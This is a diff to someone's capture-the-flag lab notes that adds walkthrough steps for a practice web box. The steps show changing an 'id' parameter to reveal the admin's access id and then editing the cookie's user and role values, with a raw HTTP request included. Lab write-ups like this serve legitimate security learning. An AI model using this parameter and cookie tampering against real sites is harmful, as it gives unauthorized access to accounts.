@@ -86,12 +86,30 @@ Finally, the flag is in the home directory as root.
 -> 22/tcp ssh
 -> 80/tcp http
 
--> we can access a website and we can take a look at target burpsuite, # Traversing the directory gives us `cdn-cgi/login`
+-> we can access a website and we can take a look at target in burpsuite, traversing the directory gives us `cdn-cgi/login`
+
+-> we can therefore log-in as a guest
+
+-> on the Account tab, we can see the parameter `id=2`, we can try changing the id to 1.
+![[Pasted image 20261120042353.png]]
+
+
+-> we got 34322 as the access id of admin! we can use burp to change the cookie for the id or just change the cookie in your browser -> Storage -> Cookies
 
 ```bash
-
-
+GET /cdn-cgi/login/admin.php?content=accounts&id=1 HTTP/1.1
+Host: 10.129.228.150
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: user=2233; role=guest   <-- change this to 34322!
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
 ```
+
+
 
 
 # Archetype
